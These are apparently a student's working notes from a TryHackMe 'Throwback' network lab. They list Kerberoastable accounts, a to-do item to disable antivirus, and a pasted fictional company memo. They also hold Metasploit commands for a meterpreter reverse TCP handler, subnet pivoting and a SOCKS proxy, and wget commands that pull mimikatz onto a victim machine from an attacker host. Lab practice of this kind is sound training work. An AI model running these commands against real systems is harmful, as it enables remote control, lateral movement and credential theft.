Kerberostable accounts:

1) SQLSERVICE
2) KRBTGT


Notes for tomorrow:
> Re-establish the proxychains connection
> Do disable AV again on the machine
> Fix neo4j on ubuntu
> Enumerate the entire Bloodhound output
> Look at TimeKeep server and submit answers on THM
> Complete Task 24 before moving on.

## Proxychain Setup Command:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 55
exploit
## Execute the pre-compiled version on prod
background
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.200.19.0/24
exploit

use auxiliary/server/socks_proxy
set VERSION 4A
exploit
```

## Downloading Mimikatz onto the victim machine
```
mkdir mimikatz
cd mimikatz
wget 10.50.17.48:8000/mimikatz/mimidrv.sys -outfile mimidrv.sys
wget 10.50.17.48:8000/mimikatz/mimikatz.exe -outfile mimikatz.exe
wget 10.50.17.48:8000/mimikatz/mimilib.dll -outfile mimilib.dll
```

Administrator doesn't work on WS01
```
Hey team! Happy Thursday!

Not much on the schedule for this week, we are continuing our transition to our new
servers please be patient with us as we make this transition.

In order to access your usual resources please go to mail.corporate.local where you will
find our new emailing service, as well as breachgtfo.local where you will find our
proprierty breach service that all of you are already used to.
If you have not already please add 10.200.x.232 to your hosts file in order to access these resources.

As we are auditing our infrastructure please remeber that no personal social media
accounts should be connected to company resources such as github. If you need to use twitter to make company announcments
please use the @tbhSecurity twitter.

Please remain patient during this transition and dont be afraid to email me or any of the
other team members with questions

Summers Winters,
CEO of Throwback Hacks Security
```